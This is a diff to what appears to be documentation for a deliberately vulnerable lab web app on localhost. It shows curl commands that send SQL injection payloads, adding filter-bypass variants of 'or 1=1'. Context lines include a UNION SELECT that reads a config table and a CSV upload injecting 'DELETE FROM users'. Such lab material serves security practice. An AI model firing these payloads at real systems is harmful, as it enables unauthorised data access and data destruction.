@@ -7,6 +7,8 @@
 curl --get --data-urlencode "name=michal" http://localhost:8080/vun/sql/example1/1/
 curl --get --data-urlencode "name=michal' or 1=1 -- -" http://localhost:8080/vun/sql/example1/1/
 curl --get --data-urlencode "name=michal' UNION SELECT * FROM config -- -" http://localhost:8080/vun/sql/example1/1/
+curl --get --data-urlencode "name=michal\' or 1=1-- -" http://localhost:8080/vun/sql/example1/1/
+curl --get --data-urlencode "name=michal\'/**/or/**/1=1/**/-- -" http://localhost:8080/vun/sql/example1/1/
 ```
 
 ### POST request - payload in json body
@@ -44,7 +46,7 @@ curl -X POST http://localhost:8080/vun/sql/example6/ -H "Content-Type: applicati
 ```bash
 echo "\"name\",\"surname\"" > /tmp/file.csv
 echo "\"michal\",\"hacker'); DELETE FROM users; -- -\"" >> /tmp/file.csv
-curl  -X POST -H "Content-Type: multipart/form-data" http://localhost:8080/vun/sql/example7/ --form file="@/tmp/file.csv"
+curl  -X POST -H "Content-Type: multipart/form-data" http://localhost:8080/vun/sql/example7/1/ --form file="@/tmp/file.csv"
 ```
 
 ## CMD Injection
